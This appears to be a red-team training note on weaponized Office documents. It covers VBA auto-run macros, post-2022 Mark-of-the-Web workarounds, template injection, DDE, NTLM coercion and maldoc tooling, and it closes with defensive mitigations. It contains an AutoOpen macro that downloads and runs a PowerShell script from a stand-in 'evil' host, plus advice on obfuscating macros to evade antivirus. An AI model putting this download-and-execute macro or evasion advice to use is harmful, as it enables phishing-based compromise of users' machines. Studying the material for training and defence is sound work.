---
tags: [c2, red-team, initial-access, office, macros, vapt]
difficulty: intermediate
module: "101 - Red Team Initial Access and Payload Delivery"
topic: "101.04 Malicious Office Documents and Macros"
---

# Malicious Office Documents and Macros

## Introduction
Weaponized Microsoft Office documents ("maldocs") were for two decades the workhorse of phishing-based initial access: a Word/Excel file that, when opened, runs **VBA macro** code to fetch and execute a payload. Microsoft's 2022 decision to **block macros by default in files marked with Mark-of-the-Web** dramatically reduced classic macro attacks and pushed operators toward other vectors (HTML smuggling, ISO/LNK, ClickFix). But maldocs remain relevant: macros still work in many internal/trusted contexts, and Office offers several **non-macro** execution paths. This note covers VBA macros, the post-2022 reality, and the alternative Office abuse primitives.

## Classic VBA Macro Execution
A macro auto-runs via `AutoOpen`/`Document_Open` (Word) or `Workbook_Open` (Excel):
```vba
Sub AutoOpen()
  Dim c As String
  c = "powershell -w hidden -c ""iwr https://evil/x.ps1 | iex"""
  CreateObject("WScript.Shell").Run c, 0, False
End Sub
```
Macros are saved in macro-enabled formats (`.docm`, `.xlsm`, or `.doc`/`.xls` legacy). The macro typically spawns a **download-and-execute cradle** ([[05 - Windows Download and Execute Cradles]]) or directly injects shellcode.

```text
+---------------------------------------------------------------+
|                 MALDOC EXECUTION PATH                        |
+---------------------------------------------------------------+
|  user opens .docm -> "Enable Content" (the gate)             |
|        |  AutoOpen macro fires                                |
|        v                                                       |
|  WScript.Shell.Run / Win32 API -> powershell/cmd/cradle       |
|        |                                                       |
|        v                                                       |
|  payload / C2 implant (parent = WINWORD.EXE  <- key signal)   |
+---------------------------------------------------------------+
```

## The Post-2022 Reality (MotW macro block)
Files with Mark-of-the-Web (internet origin) now show a **red bar / "macros blocked"** with no easy "Enable" — the classic emailed `.docm` is largely dead. Operator adaptations:
- **Strip MotW** by delivering the doc inside a container (ISO/IMG/VHD/7z) — files extracted/mounted from some containers historically lack MotW, re-enabling the "Enable Content" path (ties to [[02 - HTML Smuggling]]).
- **Target internal/trusted shares** where MotW isn't set.
- **Pivot to non-macro vectors** below.

## Non-Macro Office Abuse
- **Remote template injection** — a benign-looking `.docx` references an external `.dotm` template over HTTP; opening the doc fetches and runs the remote template's macros (the doc itself carries no macro to scan). Also yields **NTLM leak** via UNC template paths.
- **DDE (Dynamic Data Exchange)** — legacy field-code execution (`=cmd|...`); mostly mitigated but seen in old environments.
- **OLE object embedding** — embed an LNK/script/packager object the user double-clicks.
- **Equation Editor / formula exploits** (e.g. CVE-2017-11882) — memory-corruption RCE on unpatched Office, no macro needed.
- **Excel 4.0 (XLM) macros** — older, sometimes-overlooked macro engine; largely hardened now.
- **NTLM coercion via UNC** — images/templates referencing `\\attacker\share` leak Net-NTLM hashes for relay/cracking (ties to [[44 - Local NTLM Reflection and Relay]] and AD relay).

## Building / Tooling
Frameworks automate maldoc generation and obfuscation: **macro_pack**, **EvilClippy** (hides/breaks macro analysis), **MacroPack Pro**, and C2-native generators (Cobalt Strike, Mythic). Obfuscate VBA, split strings, and avoid known-bad API patterns to evade AV/AMSI ([[37 - AMSI Bypass Techniques]]).

## Why It Matters
Office documents sit at the intersection of "users open them without thinking" and "Office can execute code." Even with macros blocked by default, internal phishing, template injection, NTLM coercion, and unpatched-Office exploits keep maldocs in the toolkit. The parent-process signal (`WINWORD.EXE`/`EXCEL.EXE` spawning a shell) is also a high-fidelity detection most blue teams hunt.

## Defensive Notes
- **Keep macros blocked from the internet** (default) and, ideally, disable VBA macros entirely or allow only signed macros via GPO; block XLM/Excel 4.0.
- **Patch Office** (kills Equation Editor / formula RCEs); disable DDE; block remote template fetch (Protected View, network restrictions).
- **ASR rules**: block Office apps from creating child processes / injecting / spawning executable content.
- Detect `WINWORD/EXCEL/POWERPNT` spawning `powershell/cmd/mshta/rundll32`, and outbound UNC/HTTP template fetches.

## Related Notes
- [[01 - Phishing Tradecraft and Pretexting]]
- [[05 - Windows Download and Execute Cradles]]
- [[02 - HTML Smuggling]]
- [[44 - Local NTLM Reflection and Relay]]
- [[37 - AMSI Bypass Techniques]]
